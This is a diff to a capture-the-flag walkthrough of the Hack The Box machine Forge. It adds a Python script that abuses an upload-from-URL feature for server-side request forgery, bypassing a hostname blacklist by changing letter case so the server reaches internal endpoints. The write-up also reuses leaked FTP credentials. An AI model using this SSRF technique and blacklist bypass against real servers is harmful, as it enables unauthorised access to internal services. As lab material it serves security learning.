@@ -110,7 +110,24 @@ We see that we have the page `/announcements` which we can upload and leak.
 
 We have credentials for FTP! I tried to SSH in using the found credentials but couldn't because only login using public/private keys is allowed. The announcements also tell us how to make requests to a `/upload` endpoint. With some testing, I found that we can get the server to upload files by using "upload from url" with something like `http://ADMIN.FORGE.HTB/upload?u=http://YOUR_IP/test` (uppercase some or all characters in `admin.forge.htb` to bypass the blacklist) and get the uploaded content from the URL provided by the URL of the uploaded file. To put it simply: make the described request, grab the URL to that page, `curl` it, get another similar URL, and `curl` that to get the uploaded file. I put together a short script for testing this.
 
-```python:upload.py
+```python
+#!/usr/bin/python3
+
+import re
+import requests
+
+while True:
+    url = input(">>> ")
+    data = {"url": f"http://ADMIN.FORGE.HTB/upload?u={url}", "remote": "1"}
+    r = requests.post("http://forge.htb/upload", data=data)
+    try:
+        url = re.findall("(http://forge.htb/uploads/.{20})", r.text)[0]
+        r = requests.get(url)
+        url = re.findall("(http://forge.htb/uploads/.{20})", r.text)[0]
+        r = requests.get(url)
+        print(r.text)
+    except:
+        print(r.text)
 ```
 
 We're going through all those steps because this should make the server make requests to itself without going through firewalls, as well as using functions of an endpoint accessible only by the server internally. We were told in the announcements that FTP (and FTPS) should work in this secondary `/upload` endpoint and were given FTP credentials so let's use that. (I'm using my script but you can do it manually).
